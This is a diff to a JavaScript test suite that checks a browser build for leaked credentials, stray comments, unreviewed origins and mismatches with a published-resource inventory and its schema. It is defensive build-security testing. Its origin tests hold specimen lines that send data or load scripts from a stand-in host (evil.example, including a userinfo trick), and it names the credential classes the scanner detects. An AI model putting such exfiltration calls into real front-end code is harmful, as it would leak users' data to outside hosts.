@@ -1,5 +1,6 @@
 import assert from "node:assert/strict";
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
+import { createRequire } from "node:module";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import test from "node:test";
@@ -10,6 +11,10 @@ import { browserBuildFileName, browserBuildInventoryGaps, browserBuildOrigins, b
 const repository = join(dirname(fileURLToPath(import.meta.url)), "..");
 const frontend = join(repository, "frontend");
 const inventory = JSON.parse(readFileSync(join(repository, "security/published-web-resources.json"), "utf8"));
+const inventorySchema = JSON.parse(readFileSync(
+  join(repository, "security/published-web-resources.schema.json"), "utf8"));
+const require = createRequire(new URL("../frontend/package.json", import.meta.url));
+const Ajv = require("ajv/dist/2020").default;
 
 test("given browser build paths from either platform, when reading their filename, then metadata names stay detectable", () => {
   assert.equal(browserBuildFileName("C:\\build\\public\\robots.txt"), "robots.txt");
@@ -61,6 +66,32 @@ test("given a production browser build, when inspecting its files, then only inv
   })), /unreviewed public resource/);
 });
 
+test("given the published-web-resource inventory, when it is read, then its own schema still binds it", () => {
+  // given
+  const validate = new Ajv({ strict: true }).compile(inventorySchema);
+
+  // when / then
+  assert.ok(validate(inventory), JSON.stringify(validate.errors));
+  assert.deepEqual(inventory.credentialPatterns.map(({ id }) => id),
+    ["private-key-block", "aws-access-key-id", "github-personal-access-token"],
+    "removing a credential class removes its own falsification with it, so the set is named here too");
+  assert.deepEqual(inventory.disclosureMarkers.map(({ id }) => id),
+    ["source-map-reference", "unfinished-work-marker", "build-host-path"]);
+  assert.deepEqual(inventory.reviewedOrigins.map(({ host }) => host),
+    ["www.w3.org", "react.dev", "reactrouter.com", "react.i18next.com", "bit.ly", "github.com",
+      "scripts.sil.org", "localhost"],
+    "a new reviewed origin is a decision, so it is named where the review can see it");
+});
+
+test("given the application's own resource root, when the packaged web root is assembled, then nothing else lands in it", () => {
+  // given
+  const applicationRoot = join(repository, "src/main/resources/static");
+
+  // when / then
+  assert.equal(existsSync(applicationRoot) && readdirSync(applicationRoot).length > 0, false,
+    "a file here is served under the same permitted paths and the build policy never reads it");
+});
+
 test("given every declared credential and disclosure pattern, when its specimen ships, then the build is refused", (context) => {
   // given
   const build = temporaryBuild(context);
@@ -91,6 +122,17 @@ test("given shipped markup, styles and scripts, when reading their comments, the
   assert.throws(() => verifyBrowserBuild(build({
     "index.html": "<!-- deployed from the release runner -->"
   })), /unreviewed comment in index\.html/);
+  assert.throws(() => verifyBrowserBuild(build({
+    "index.html": "<!-- deployed from the release runner --!>"
+  })), /unreviewed comment in index\.html/, "the parser closes a comment on --!> as well");
+  assert.throws(() => verifyBrowserBuild(build({ "index.html": "<!-->" })),
+    /unreviewed comment in index\.html/);
+  assert.throws(() => verifyBrowserBuild(build({
+    "index.html": "<script>/* built on the release runner */</script>"
+  })), /unreviewed comment in index\.html/, "an inlined script carries its comments into the document");
+  assert.throws(() => verifyBrowserBuild(build({
+    "index.html": "<style>/* staging override */</style>"
+  })), /unreviewed comment in index\.html/);
   verifyBrowserBuild(build({ "assets/app.js": "const pattern = /\\/*/; console.log(pattern)" }));
 });
 
@@ -106,6 +148,18 @@ test("given shipped resources, when reading the origins they name, then an unrev
   assert.throws(() => verifyBrowserBuild(build({
     "icon.svg": "<svg xmlns=\"http://www.w3.org.example.invalid/2000/svg\"></svg>"
   })), /unreviewed origin www\.w3\.org\.example\.invalid in icon\.svg/);
+  assert.throws(() => verifyBrowserBuild(build({
+    "assets/app.js": "fetch('https://github.com@evil.example/collect')"
+  })), /unreviewed origin evil\.example/, "userinfo names the host the browser will not contact");
+  assert.throws(() => verifyBrowserBuild(build({
+    "assets/app.js": "fetch('HTTPS://EVIL.EXAMPLE/collect')"
+  })), /unreviewed origin evil\.example/);
+  assert.throws(() => verifyBrowserBuild(build({
+    "assets/app.js": "new WebSocket('wss://evil.example/stream')"
+  })), /unreviewed origin evil\.example/);
+  assert.throws(() => verifyBrowserBuild(build({
+    "index.html": "<script src=\"//evil.example/a.js\"></script>"
+  })), /unreviewed origin evil\.example/);
   assert.deepEqual(browserBuildOrigins("<svg xmlns=\"http://www.w3.org/2000/svg\">"), ["www.w3.org"]);
   verifyBrowserBuild(build({
     "icon.svg": `<svg xmlns="http://${reviewed[0]}/2000/svg"></svg>`
@@ -142,4 +196,13 @@ test("given production browser sources, when building the web root, then metadat
   verifyBrowserBuild(output);
   assert.deepEqual(browserBuildInventoryGaps(output), [],
     "an entry the build no longer produces is a review the inventory still claims to have had");
+  const shipped = readdirSync(output, { recursive: true, withFileTypes: true })
+    .filter((entry) => entry.isFile())
+    .map((entry) => `/${join(entry.parentPath, entry.name).slice(output.length + 1).replaceAll("\\\\", "/")}`);
+  for (const declared of inventory.anonymousStaticPaths) {
+    const expression = new RegExp(`^${declared.split("*").map((part) =>
+      part.replaceAll(/[.*+?^${}()|[\]\\]/g, String.raw`\$&`)).join(".*")}$`);
+    assert.ok(shipped.some((path) => expression.test(path)),
+      `${declared} is permitted anonymously and the build produces nothing that matches it`);
+  }
 });
